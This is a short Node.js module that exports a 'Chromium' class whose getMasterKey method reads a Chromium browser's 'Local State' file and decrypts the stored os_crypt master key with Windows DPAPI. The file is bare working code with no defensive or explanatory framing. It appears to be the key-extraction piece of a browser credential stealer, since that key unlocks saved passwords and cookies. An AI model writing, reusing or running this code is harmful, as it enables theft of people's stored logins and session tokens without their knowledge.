const Aurita = require("win-dpapi");
const path   = require("path");
const fs     = require("fs");

class Chromium {
     getMasterKey = (basePath) => {
        const filePaths = [
            path.join(basePath, 'Local State'),
            path.join(basePath, '..', 'Local State')
        ];

        for (const filePath of filePaths) {
            if (fs.existsSync(filePath)) {
                try {
                    const localState = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                    const encryptedKey = localState.os_crypt?.encrypted_key;

                    if (encryptedKey) {
                        const buffer = Buffer.from(encryptedKey, 'base64');
                        const slicedBuffer = buffer.slice(5);
                        const decryptedKey = Aurita.unprotectData(slicedBuffer, null, 'CurrentUser');
                        return decryptedKey;
                    }
                } catch (error) {
                    return '';
                }
            }
        }
    }
}

module.exports = {
    Chromium
}